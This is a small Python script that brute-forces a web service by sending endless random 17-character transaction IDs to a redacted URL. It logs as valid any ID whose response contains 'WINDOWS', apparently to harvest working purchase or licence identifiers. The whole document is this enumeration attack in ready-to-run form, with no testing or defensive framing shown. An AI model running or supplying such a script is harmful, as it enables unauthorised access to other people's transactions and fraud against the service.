#!/usr/bin/python
import requests
import uuid 

while True:
    #Generate random transaction id
    transaction_id = uuid.uuid4().hex[:17].upper()
    #This is a valid transaction_id :
    #transaction_id = "***********"

    payload = {'tx':transaction_id}

    #Call the url
    r = requests.get('http://******', params=payload)

    if 'WINDOWS' in r.text:
        #Save the valid transaction in a file
        f = open("test", "a")
        f.write(transaction_id+"\n")
        print(transaction_id+" valid!")
    else:
        print(transaction_id+" fails.")


